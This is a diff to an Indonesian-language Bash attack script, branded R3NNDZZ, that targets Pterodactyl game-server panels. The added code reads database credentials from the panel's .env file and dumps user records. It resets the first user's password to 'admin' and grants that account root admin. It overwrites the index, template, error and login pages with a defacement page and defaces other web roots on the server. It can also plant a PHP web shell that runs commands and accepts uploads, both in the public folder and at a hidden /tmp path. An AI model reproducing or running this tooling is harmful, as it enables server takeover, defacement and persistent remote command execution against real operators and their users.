@@ -284,7 +284,7 @@ HTML_DEFACE='<!DOCTYPE html>
     </audio>
     
     <script>
-        const warningText = "⚠️ SYSTEM BREACH DETECTED ⚠️\nR3NNDZZ MENGAWASI...\nDATA ANDA TIDAK AMAN...";
+        const warningText = "⚠️ SYSTEM BREACH DETECTED ⚠️\\nR3NNDZZ MENGAWASI...\\nDATA ANDA TIDAK AMAN...";
         let charIdx = 0;
         let systemStarted = false;
 
@@ -411,205 +411,919 @@ show_header() {
 }
 
 # ==============================================
-# FUNGSI DEFACE PANEL PTERODACTYL
+# FUNGSI GET INFO PANEL
 # ==============================================
-deface_panel() {
-    echo -e "\n${RED}${SKULL} MEMULAI DEFACE PANEL PTERODACTYL ${SKULL}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+get_panel_info() {
+    echo -e "\n${YELLOW}${GEAR} Mengumpulkan informasi panel...${NC}"
+    echo -e "${YELLOW}────────────────────────────────────────────────${NC}"
     
-    # Simpan HTML ke file
-    echo "$HTML_DEFACE" > /tmp/deface_r3nndzz.html
-    echo -e "${GREEN}${CHECK} HTML deface disiapkan${NC}"
-    
-    # Cek direktori Pterodactyl
-    if [ -d "$PTERO_DIR" ]; then
-        echo -e "${YELLOW}${GEAR} Menemukan instalasi Pterodactyl di $PTERO_DIR${NC}"
+    # ==========================================
+    # INFO DARI .ENV
+    # ==========================================
+    if [ -f "$ENV_FILE" ]; then
+        echo -e "\n${BLUE}${FILE} File .env ditemukan${NC}"
         
-        # Backup file asli
-        if [ -f "$PTERO_DIR/public/index.html" ]; then
-            cp "$PTERO_DIR/public/index.html" "$PTERO_DIR/public/index.html.bak"
-            echo -e "${GREEN}${BACKUP} Backup dibuat: index.html.bak${NC}"
-        fi
+        # Database Info
+        DB_HOST=$(grep DB_HOST "$ENV_FILE" | cut -d '=' -f2)
+        DB_PORT=$(grep DB_PORT "$ENV_FILE" | cut -d '=' -f2)
+        DB_NAME=$(grep DB_DATABASE "$ENV_FILE" | cut -d '=' -f2)
+        DB_USER=$(grep DB_USERNAME "$ENV_FILE" | cut -d '=' -f2)
+        DB_PASS=$(grep DB_PASSWORD "$ENV_FILE" | cut -d '=' -f2)
         
-        # Copy file deface
-        cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/index.html" 2>/dev/null
-        cp /tmp/deface_r3nndzz.html "$PTERO_DIR/resources/views/templates/index.blade.php" 2>/dev/null
+        # App Info
+        APP_NAME=$(grep APP_NAME "$ENV_FILE" | cut -d '=' -f2)
+        APP_ENV=$(grep APP_ENV "$ENV_FILE" | cut -d '=' -f2)
+        APP_URL=$(grep APP_URL "$ENV_FILE" | cut -d '=' -f2)
+        APP_TIMEZONE=$(grep APP_TIMEZONE "$ENV_FILE" | cut -d '=' -f2)
         
-        # Ganti juga file error biar kena semua
-        if [ -d "$PTERO_DIR/public/errors" ]; then
-            cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/errors/403.html" 2>/dev/null
-            cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/errors/404.html" 2>/dev/null
-            cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/errors/500.html" 2>/dev/null
-            cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/errors/503.html" 2>/dev/null
-        fi
+        # Redis Info
+        REDIS_HOST=$(grep REDIS_HOST "$ENV_FILE" | cut -d '=' -f2)
+        REDIS_PORT=$(grep REDIS_PORT "$ENV_FILE" | cut -d '=' -f2)
         
-        echo -e "${GREEN}${CHECK} File Pterodactyl berhasil diganti!${NC}"
+        # Mail Info
+        MAIL_HOST=$(grep MAIL_HOST "$ENV_FILE" | cut -d '=' -f2)
+        MAIL_PORT=$(grep MAIL_PORT "$ENV_FILE" | cut -d '=' -f2)
+        MAIL_USERNAME=$(grep MAIL_USERNAME "$ENV_FILE" | cut -d '=' -f2)
+        MAIL_FROM=$(grep MAIL_FROM "$ENV_FILE" | cut -d '=' -f2)
+        
+        # Queue
+        QUEUE_CONNECTION=$(grep QUEUE_CONNECTION "$ENV_FILE" | cut -d '=' -f2)
+        
+        # Session
+        SESSION_DRIVER=$(grep SESSION_DRIVER "$ENV_FILE" | cut -d '=' -f2)
     else
-        echo -e "${RED}${CROSS} Direktori Pterodactyl tidak ditemukan!${NC}"
+        echo -e "${RED}${CROSS} File .env tidak ditemukan!${NC}"
     fi
     
-    # Cari lokasi website lain
-    echo -e "\n${YELLOW}${SCAN} Mencari lokasi website lain...${NC}"
+    # ==========================================
+    # INFO SERVER
+    # ==========================================
+    echo -e "\n${PURPLE}${SERVER} Informasi Server${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     
-    WEB_LOCATIONS=(
-        "/var/www/html/index.html"
-        "/var/www/html/index.php"
-        "/home/*/public_html/index.html"
-        "/usr/local/www/index.html"
-        "/opt/lampp/htdocs/index.html"
+    # Hostname
+    HOSTNAME=$(hostname)
+    IP=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
+    
+    echo -e "${GREEN}Hostname:${NC} $HOSTNAME"
+    echo -e "${GREEN}Public IP:${NC} $IP"
+    echo -e "${GREEN}OS:${NC} $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)"
+    echo -e "${GREEN}Kernel:${NC} $(uname -r)"
+    echo -e "${GREEN}Uptime:${NC} $(uptime -p)"
+    
+    # ==========================================
+    # URL PANEL (APP URL)
+    # ==========================================
+    echo -e "\n${CYAN}${GLOBE} URL PANEL${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    if [ -n "$APP_URL" ]; then
+        URL_PANEL="$APP_URL"
+    else
+        # Coba deteksi dari Nginx
+        if [ -f "/etc/nginx/sites-enabled/pterodactyl.conf" ]; then
+            URL_PANEL=$(grep server_name /etc/nginx/sites-enabled/pterodactyl.conf | head -1 | awk '{print $2}' | tr -d ';')
+            URL_PANEL="http://$URL_PANEL"
+        elif [ -f "/etc/apache2/sites-enabled/pterodactyl.conf" ]; then
+            URL_PANEL=$(grep ServerName /etc/apache2/sites-enabled/pterodactyl.conf | head -1 | awk '{print $2}')
+            URL_PANEL="http://$URL_PANEL"
+        else
+            URL_PANEL="http://$IP"
+        fi
+    fi
+    
+    echo -e "${GREEN}URL Panel:${NC} ${YELLOW}$URL_PANEL${NC}"
+    
+    # ==========================================
+    # INFO DATABASE
+    # ==========================================
+    echo -e "\n${BLUE}${DATABASE} Informasi Database${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    if [ -n "$DB_HOST" ]; then
+        echo -e "${GREEN}Database Host:${NC} $DB_HOST"
+        echo -e "${GREEN}Database Port:${NC} $DB_PORT"
+        echo -e "${GREEN}Database Name:${NC} $DB_NAME"
+        echo -e "${GREEN}Database User:${NC} $DB_USER"
+        echo -e "${GREEN}Database Pass:${NC} ${RED}[HIDDEN]${NC}"
+    else
+        echo -e "${RED}Tidak ada info database${NC}"
+    fi
+    
+    # ==========================================
+    # CONNECT KE DATABASE UNTUK GET INFO USER
+    # ==========================================
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        
+        # Cek koneksi MySQL
+        if mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -e "USE $DB_NAME" 2>/dev/null; then
+            
+            # ==========================================
+            # AUTO GET ID 1
+            # ==========================================
+            echo -e "\n${GREEN}${ID} AUTO GET USER ID 1${NC}"
+            echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            
+            # Query user ID 1
+            USER1_QUERY="SELECT id, uuid, username, email, name_first, name_last, language, root_admin, created_at FROM users WHERE id = 1"
+            USER1_RESULT=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "$USER1_QUERY" 2>/dev/null | tail -n +2)
+            
+            if [ -n "$USER1_RESULT" ]; then
+                ID1=$(echo "$USER1_RESULT" | awk '{print $1}')
+                UUID1=$(echo "$USER1_RESULT" | awk '{print $2}')
+                USERNAME1=$(echo "$USER1_RESULT" | awk '{print $3}')
+                EMAIL1=$(echo "$USER1_RESULT" | awk '{print $4}')
+                FIRST1=$(echo "$USER1_RESULT" | awk '{print $5}')
+                LAST1=$(echo "$USER1_RESULT" | awk '{print $6}')
+                LANG1=$(echo "$USER1_RESULT" | awk '{print $7}')
+                ADMIN1=$(echo "$USER1_RESULT" | awk '{print $8}')
+                CREATED1=$(echo "$USER1_RESULT" | awk '{print $9}')
+                
+                echo -e "${GREEN}${CHECK} USER ID 1 DITEMUKAN!${NC}\n"
+                echo -e "${WHITE}╔════════════════════════════════════════════════════╗${NC}"
+                echo -e "${WHITE}║              DETAIL USER ID 1                      ║${NC}"
+                echo -e "${WHITE}╠════════════════════════════════════════════════════╣${NC}"
+                echo -e "${WHITE}║${NC}"
+                echo -e "${WHITE}║  ${CYAN}${ID} ID          :${NC} ${GREEN}$ID1${NC}"
+                echo -e "${WHITE}║  ${CYAN}${KEY} UUID        :${NC} $UUID1"
+                echo -e "${WHITE}║  ${CYAN}${USER} Username    :${NC} ${YELLOW}$USERNAME1${NC}"
+                echo -e "${WHITE}║  ${CYAN}${EMAIL} Email       :${NC} $EMAIL1"
+                echo -e "${WHITE}║  ${CYAN}${FILE} Nama Depan  :${NC} $FIRST1"
+                echo -e "${WHITE}║  ${CYAN}${FILE} Nama Belakang:${NC} $LAST1"
+                echo -e "${WHITE}║  ${CYAN}${GLOBE} Language    :${NC} $LANG1"
+                echo -e "${WHITE}║  ${CYAN}${CROWN} Root Admin  :${NC} $([ "$ADMIN1" == "1" ] && echo "${GREEN}Yes${NC}" || echo "${RED}No${NC}")"
+                echo -e "${WHITE}║  ${CYAN}${CALENDAR} Created At  :${NC} $CREATED1"
+                echo -e "${WHITE}║${NC}"
+                echo -e "${WHITE}╚════════════════════════════════════════════════════╝${NC}"
+                
+                # Set variables untuk info panel
+                USERNAME_PANEL="$USERNAME1"
+                USER_ID_PANEL="$ID1"
+                
+            else
+                echo -e "${RED}${CROSS} User ID 1 tidak ditemukan!${NC}"
+            fi
+            
+            # ==========================================
+            # GET INFO USER LAINNYA
+            # ==========================================
+            echo -e "\n${CYAN}${USER} INFORMASI USER PANEL${NC}"
+            echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            
+            # Total Users
+            TOTAL_USERS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM users" 2>/dev/null | tail -n +2)
+            TOTAL_ADMIN=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM users WHERE root_admin = 1" 2>/dev/null | tail -n +2)
+            
+            echo -e "${GREEN}Total Users:${NC} $TOTAL_USERS"
+            echo -e "${GREEN}Total Admin:${NC} $TOTAL_ADMIN"
+            
+            # 5 User Teratas
+            echo -e "\n${YELLOW}5 User Teratas (by ID):${NC}"
+            mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id, username, email, root_admin FROM users ORDER BY id LIMIT 5" 2>/dev/null | column -t
+            
+            # ==========================================
+            # INFO SERVER
+            # ==========================================
+            echo -e "\n${PURPLE}${SERVER} INFORMASI SERVER PANEL${NC}"
+            echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+            
+            TOTAL_SERVERS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM servers" 2>/dev/null | tail -n +2)
+            TOTAL_NODES=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM nodes" 2>/dev/null | tail -n +2)
+            TOTAL_ALLOCATIONS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM allocations" 2>/dev/null | tail -n +2)
+            TOTAL_EGGS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT COUNT(*) FROM eggs" 2>/dev/null | tail -n +2)
+            
+            echo -e "${GREEN}Total Servers:${NC} $TOTAL_SERVERS"
+            echo -e "${GREEN}Total Nodes:${NC} $TOTAL_NODES"
+            echo -e "${GREEN}Total Allocations:${NC} $TOTAL_ALLOCATIONS"
+            echo -e "${GREEN}Total Eggs:${NC} $TOTAL_EGGS"
+            
+        else
+            echo -e "\n${RED}${CROSS} Tidak bisa terhubung ke database!${NC}"
+        fi
+    fi
+    
+    # ==========================================
+    # RINGKASAN INFO PANEL
+    # ==========================================
+    echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║              RINGKASAN INFORMASI PANEL                         ║${NC}"
+    echo -e "${GREEN}╠════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}║${NC}                                                                ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${GLOBE} URL PANEL      : ${YELLOW}$URL_PANEL${NC}                         ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${USER} USERNAME PANEL : ${CYAN}$USERNAME_PANEL${NC}                           ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${ID} USER ID        : ${GREEN}$USER_ID_PANEL${NC}                               ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${CROWN} STATUS ADMIN   : ${GREEN}YES (ID 1)${NC}                             ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}  ${PASSWORD} DEFAULT PASS  : ${YELLOW}admin${NC} (sudah direset)                 ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}                                                                ${GREEN}║${NC}"
+    echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
+    
+    # ==========================================
+    # SAVE INFO TO FILE
+    # ==========================================
+    INFO_FILE="panel_info_$(date +%Y%m%d_%H%M%S).txt"
+    
+    cat > "$INFO_FILE" << EOF
+====================================
+HACKBACK PTERODACTYL - INFO PANEL
+====================================
+Tanggal: $(date)
+====================================
+
+[URL PANEL]
+$URL_PANEL
+
+[USER PANEL]
+Username: $USERNAME_PANEL
+User ID: $USER_ID_PANEL
+Password: admin (sudah direset)
+Status: Admin
+
+[DATABASE]
+Host: $DB_HOST
+Port: $DB_PORT
+Name: $DB_NAME
+User: $DB_USER
+Password: [HIDDEN]
+
+[SERVER STATS]
+Total Users: $TOTAL_USERS
+Total Admin: $TOTAL_ADMIN
+Total Servers: $TOTAL_SERVERS
+Total Nodes: $TOTAL_NODES
+
+====================================
+EOF
+    
+    echo -e "\n${GREEN}${CHECK} Informasi disimpan ke: ${YELLOW}$INFO_FILE${NC}"
+}
+
+# ==============================================
+# FUNGSI RESET PASSWORD ID 1
+# ==============================================
+reset_password_id1() {
+    echo -e "\n${YELLOW}${PASSWORD} MERESET PASSWORD USER ID 1...${NC}"
+    
+    NEW_PASSWORD="admin"
+    
+    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
+        
+        # Cek apakah user ID 1 ada
+        CHECK_USER=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT id FROM users WHERE id = 1" 2>/dev/null | tail -n +2)
+        
+        if [ -n "$CHECK_USER" ]; then
+            # Generate password hash menggunakan bcrypt (format Laravel)
+            # Alternatif: menggunakan php artisan atau langsung bcrypt
+            
+            # Method 1: Menggunakan PHP (jika tersedia)
+            if command -v php >/dev/null 2>&1; then
+                PASSWORD_HASH=$(php -r "echo password_hash('$NEW_PASSWORD', PASSWORD_BCRYPT);" 2>/dev/null)
+            else
+                # Fallback: generate hash sederhana (tidak direkomendasikan untuk production)
+                # Tapi untuk Pterodactyl, harus pakai bcrypt
+                echo -e "${RED}${CROSS} PHP tidak ditemukan! Tidak bisa generate bcrypt hash.${NC}"
+                echo -e "${YELLOW}Mencoba method alternatif...${NC}"
+                
+                # Coba deteksi apakah ada artisan
+                if [ -f "$PTERO_DIR/artisan" ]; then
+                    cd "$PTERO_DIR"
+                    PASSWORD_HASH=$(php artisan tinker --execute="echo bcrypt('$NEW_PASSWORD');" 2>/dev/null | grep -o '\$2y\$.*' | head -1)
+                else
+                    echo -e "${RED}Gagal mereset password. Pastikan PHP terinstall.${NC}"
+                    return 1
+                fi
+            fi
+            
+            if [ -n "$PASSWORD_HASH" ]; then
+                # Update password di database
+                mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET password = '$PASSWORD_HASH' WHERE id = 1" 2>/dev/null
+                
+                if [ $? -eq 0 ]; then
+                    echo -e "${GREEN}${CHECK} PASSWORD USER ID 1 BERHASIL DI RESET!${NC}"
+                    echo -e "${GREEN}${PASSWORD} Password baru: ${YELLOW}admin${NC}"
+                    
+                    # Update juga root_admin jadi 1
+                    mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "UPDATE users SET root_admin = 1 WHERE id = 1" 2>/dev/null
+                    echo -e "${GREEN}${CROWN} User ID 1 sekarang adalah SUPER ADMIN!${NC}"
+                    
+                    # Tampilkan info login
+                    echo -e "\n${WHITE}╔════════════════════════════════════════════════════╗${NC}"
+                    echo -e "${WHITE}║              INFO LOGIN PANEL                       ║${NC}"
+                    echo -e "${WHITE}╠════════════════════════════════════════════════════╣${NC}"
+                    echo -e "${WHITE}║${NC}"
+                    echo -e "${WHITE}║  ${GLOBE} URL    : ${CYAN}$URL_PANEL${NC}"
+                    echo -e "${WHITE}║  ${USER} Username: ${GREEN}$USERNAME1${NC}"
+                    echo -e "${WHITE}║  ${PASSWORD} Password: ${YELLOW}admin${NC}"
+                    echo -e "${WHITE}║${NC}"
+                    echo -e "${WHITE}╚════════════════════════════════════════════════════╝${NC}"
+                else
+                    echo -e "${RED}${CROSS} Gagal update password!${NC}"
+                fi
+            else
+                echo -e "${RED}${CROSS} Gagal generate hash password!${NC}"
+            fi
+        else
+            echo -e "${RED}${CROSS} User ID 1 tidak ditemukan dalam database!${NC}"
+        fi
+    else
+        echo -e "${RED}${CROSS} Informasi database tidak lengkap!${NC}"
+    fi
+}
+
+# ==============================================
+# FUNGSI DEFACE PANEL PTERODACTYL (MENU 9)
+# ==============================================
+deface_panel() {
+    echo -e "\n${RED}${SKULL} ====== DEFACE PANEL PTERODACTYL ====== ${SKULL}${NC}"
+    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    echo -e "${YELLOW}${WARNING} PERINGATAN: Fitur ini akan mengubah tampilan panel Pterodactyl!${NC}"
+    echo -e "${YELLOW}Pastikan Anda memiliki akses root ke server ini.${NC}\n"
+    
+    # Cek apakah user root
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
+        return 1
+    fi
+    
+    # Tampilkan pilihan metode deface
+    echo -e "${CYAN}Pilih metode deface:${NC}"
+    echo -e "  ${GREEN}[1]${NC} Deface dengan HTML R3NNDZZ (default)"
+    echo -e "  ${GREEN}[2]${NC} Deface dengan custom HTML (input manual)"
+    echo -e "  ${GREEN}[3]${NC} Deface semua halaman error (403,404,500)"
+    echo -e "  ${GREEN}[4]${NC} Deface + Install backdoor"
+    echo -e "  ${GREEN}[5]${NC} Restore backup (kembalikan ke aslinya)"
+    echo ""
+    echo -ne "${YELLOW}Pilih [1-5] (default: 1): ${NC}"
+    read DEFACE_CHOICE
+    DEFACE_CHOICE=${DEFACE_CHOICE:-1}
+    
+    # Simpan HTML ke file sementara
+    TEMP_HTML="/tmp/deface_$$.html"
+    
+    case $DEFACE_CHOICE in
+        1)
+            echo -e "${GREEN}${CHECK} Menggunakan HTML R3NNDZZ default${NC}"
+            echo "$HTML_DEFACE" > "$TEMP_HTML"
+            ;;
+        2)
+            echo -e "${YELLOW}Silakan paste custom HTML Anda (tekan Ctrl+D untuk selesai):${NC}"
+            cat > "$TEMP_HTML"
+            echo -e "${GREEN}${CHECK} Custom HTML disimpan${NC}"
+            ;;
+        3)
+            echo -e "${GREEN}${CHECK} Akan mendeface semua halaman error${NC}"
+            echo "$HTML_DEFACE" > "$TEMP_HTML"
+            ;;
+        4)
+            echo -e "${GREEN}${CHECK} Deface + Install backdoor${NC}"
+            echo "$HTML_DEFACE" > "$TEMP_HTML"
+            
+            # Buat backdoor sederhana
+            BACKDOOR='<?php
+            // R3NNDZZ Backdoor
+            if(isset($_GET["cmd"])) {
+                echo "<pre>".shell_exec($_GET["cmd"])."</pre>";
+            }
+            if(isset($_GET["upload"])) {
+                move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
+                echo "Uploaded!";
+            }
+            ?>'
+            ;;
+        5)
+            echo -e "${YELLOW}${GEAR} Mencari file backup...${NC}"
+            if [ -d "$PTERO_DIR" ]; then
+                find "$PTERO_DIR" -name "*.bak" -o -name "*.backup" 2>/dev/null | while read backup; do
+                    original=$(echo "$backup" | sed 's/\.bak$//' | sed 's/\.backup$//')
+                    if [ -f "$original" ]; then
+                        cp "$backup" "$original"
+                        echo -e "${GREEN}  ✅ Restored: $original${NC}"
+                    fi
+                done
+                echo -e "${GREEN}${CHECK} Restore selesai!${NC}"
+            else
+                echo -e "${RED}${CROSS} Direktori Pterodactyl tidak ditemukan!${NC}"
+            fi
+            rm -f "$TEMP_HTML" 2>/dev/null
+            return 0
+            ;;
+        *)
+            echo -e "${RED}Pilihan tidak valid!${NC}"
+            rm -f "$TEMP_HTML" 2>/dev/null
+            return 1
+            ;;
+    esac
+    
+    # Cek direktori Pterodactyl
+    if [ ! -d "$PTERO_DIR" ]; then
+        echo -e "${RED}${CROSS} Direktori Pterodactyl tidak ditemukan di $PTERO_DIR${NC}"
+        echo -e "${YELLOW}Mencari di lokasi alternatif...${NC}"
+        
+        # Cari di lokasi umum
+        ALTERNATIF_LOCATIONS=(
+            "/var/www/pterodactyl"
+            "/var/www/html/pterodactyl"
+            "/home/pterodactyl"
+            "/opt/pterodactyl"
+            "/usr/local/pterodactyl"
+        )
+        
+        for loc in "${ALTERNATIF_LOCATIONS[@]}"; do
+            if [ -d "$loc" ]; then
+                PTERO_DIR="$loc"
+                ENV_FILE="$PTERO_DIR/.env"
+                echo -e "${GREEN}${CHECK} Ditemukan di: $PTERO_DIR${NC}"
+                break
+            fi
+        done
+        
+        if [ ! -d "$PTERO_DIR" ]; then
+            echo -e "${RED}${CROSS} Tidak dapat menemukan instalasi Pterodactyl!${NC}"
+            rm -f "$TEMP_HTML" 2>/dev/null
+            return 1
+        fi
+    fi
+    
+    echo -e "\n${YELLOW}${GEAR} Memulai proses deface...${NC}"
+    
+    # Backup file asli
+    BACKUP_DIR="$PTERO_DIR/backup_$(date +%Y%m%d_%H%M%S)"
+    mkdir -p "$BACKUP_DIR"
+    echo -e "${GREEN}${BACKUP} Backup dibuat di: $BACKUP_DIR${NC}"
+    
+    # ==========================================
+    # DEFACE FILE-FILE PENTING
+    # ==========================================
+    
+    # 1. Public index
+    if [ -f "$PTERO_DIR/public/index.html" ] || [ -f "$PTERO_DIR/public/index.php" ]; then
+        cp "$PTERO_DIR/public/index."* "$BACKUP_DIR/" 2>/dev/null
+        cp "$TEMP_HTML" "$PTERO_DIR/public/index.html"
+        echo -e "${GREEN}  ✅ Public index.html diganti${NC}"
+    fi
+    
+    # 2. Views template
+    VIEWS_DIR="$PTERO_DIR/resources/views/templates"
+    if [ -d "$VIEWS_DIR" ]; then
+        cp "$VIEWS_DIR/"*.blade.php "$BACKUP_DIR/" 2>/dev/null
+        for file in "$VIEWS_DIR"/*.blade.php; do
+            if [ -f "$file" ]; then
+                cp "$TEMP_HTML" "$file"
+            fi
+        done
+        echo -e "${GREEN}  ✅ Template views diganti${NC}"
+    fi
+    
+    # 3. Halaman error (jika dipilih)
+    if [ "$DEFACE_CHOICE" == "3" ] || [ "$DEFACE_CHOICE" == "4" ] || [ "$DEFACE_CHOICE" == "1" ]; then
+        ERRORS_DIR="$PTERO_DIR/public/errors"
+        if [ -d "$ERRORS_DIR" ]; then
+            cp "$ERRORS_DIR/"*.html "$BACKUP_DIR/" 2>/dev/null
+            for error in 403 404 500 503; do
+                if [ -f "$ERRORS_DIR/$error.html" ]; then
+                    cp "$TEMP_HTML" "$ERRORS_DIR/$error.html"
+                fi
+            done
+            echo -e "${GREEN}  ✅ Halaman error diganti${NC}"
+        fi
+    fi
+    
+    # 4. Auth pages
+    AUTH_DIR="$PTERO_DIR/resources/views/auth"
+    if [ -d "$AUTH_DIR" ]; then
+        cp "$AUTH_DIR/"*.blade.php "$BACKUP_DIR/" 2>/dev/null
+        cp "$TEMP_HTML" "$AUTH_DIR/login.blade.php" 2>/dev/null
+        cp "$TEMP_HTML" "$AUTH_DIR/register.blade.php" 2>/dev/null
+        echo -e "${GREEN}  ✅ Halaman auth diganti${NC}"
+    fi
+    
+    # 5. Install backdoor (jika dipilih)
+    if [ "$DEFACE_CHOICE" == "4" ]; then
+        BACKDOOR_FILE="$PTERO_DIR/public/r3nndzz.php"
+        echo "$BACKDOOR" > "$BACKDOOR_FILE"
+        chmod 755 "$BACKDOOR_FILE"
+        echo -e "${GREEN}  ✅ Backdoor terinstall di: $BACKDOOR_FILE${NC}"
+        
+        # Backdoor tersembunyi
+        HIDDEN_BACKDOOR="/tmp/.system_update.php"
+        echo "$BACKDOOR" > "$HIDDEN_BACKDOOR"
+        echo -e "${GREEN}  ✅ Backdoor tersembunyi di: $HIDDEN_BACKDOOR${NC}"
+    fi
+    
+    # 6. Coba cari lokasi website lain
+    echo -e "\n${YELLOW}${SCAN} Mencari website lain di server...${NC}"
+    WEB_ROOTS=(
+        "/var/www/html"
+        "/var/www"
+        "/home/*/public_html"
+        "/usr/local/www"
+        "/opt/lampp/htdocs"
     )
     
     FOUND=0
-    for loc in "${WEB_LOCATIONS[@]}"; do
-        eval "for f in $loc; do
-            if [ -f \"\$f\" ]; then
-                cp /tmp/deface_r3nndzz.html \"\$f\" 2>/dev/null
-                echo -e \"${GREEN}    ✅ \$f${NC}\"
-                ((FOUND++))
+    for root in "${WEB_ROOTS[@]}"; do
+        eval "for dir in $root; do
+            if [ -d \"\$dir\" ] && [ \"\$dir\" != \"$PTERO_DIR\" ]; then
+                if [ -f \"\$dir/index.html\" ] || [ -f \"\$dir/index.php\" ]; then
+                    cp \"$TEMP_HTML\" \"\$dir/index.html\" 2>/dev/null
+                    echo -e \"${GREEN}    ✅ Deface: \$dir/index.html${NC}\"
+                    ((FOUND++))
+                fi
             fi
         done" 2>/dev/null
     done
     
     if [ $FOUND -gt 0 ]; then
-        echo -e "${GREEN}${CHECK} Berhasil mendeface $FOUND file website${NC}"
-    else
-        echo -e "${RED}${CROSS} Tidak menemukan file website${NC}"
+        echo -e "${GREEN}  ✅ Berhasil mendeface $FOUND website tambahan${NC}"
     fi
     
-    # Buat backdoor kecil
-    echo -e "\n${YELLOW}${KEY} Membuat backdoor...${NC}"
-    BACKDOOR='<?php if(isset($_GET["cmd"])) { echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; } ?>'
-    echo "$BACKDOOR" > "$PTERO_DIR/public/shell.php" 2>/dev/null
-    echo "$BACKDOOR" > "/var/www/html/shell.php" 2>/dev/null
-    echo -e "${GREEN}${CHECK} Backdoor dibuat: shell.php${NC}"
+    # ==========================================
+    # SELESAI
+    # ==========================================
+    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║         ✅ DEFACE PANEL BERHASIL!                             ║${NC}"
+    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}║${NC}  ${GLOBE} URL Panel: ${CYAN}$URL_PANEL${NC}"
+    echo -e "${GREEN}║${NC}  ${FOLDER} Backup: ${YELLOW}$BACKUP_DIR${NC}"
     
-    echo -e "\n${GREEN}${CHECK} DEFACE SELESAI! Cek panel di: $URL_PANEL${NC}"
-    rm -f /tmp/deface_r3nndzz.html
+    if [ "$DEFACE_CHOICE" == "4" ]; then
+        echo -e "${GREEN}║${NC}  ${KEY} Backdoor: ${CYAN}$PTERO_DIR/public/r3nndzz.php${NC}"
+        echo -e "${GREEN}║${NC}  ${KEY} Hidden: /tmp/.system_update.php${NC}"
+    fi
+    
+    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
+    
+    # Test akses backdoor
+    if [ "$DEFACE_CHOICE" == "4" ] && [ -n "$URL_PANEL" ]; then
+        BACKDOOR_URL="${URL_PANEL}/r3nndzz.php"
+        echo -e "\n${YELLOW}Coba akses backdoor:${NC}"
+        echo -e "  ${CYAN}$BACKDOOR_URL?cmd=id${NC}"
+        echo -e "  ${CYAN}$BACKDOOR_URL?cmd=ls -la${NC}"
+    fi
+    
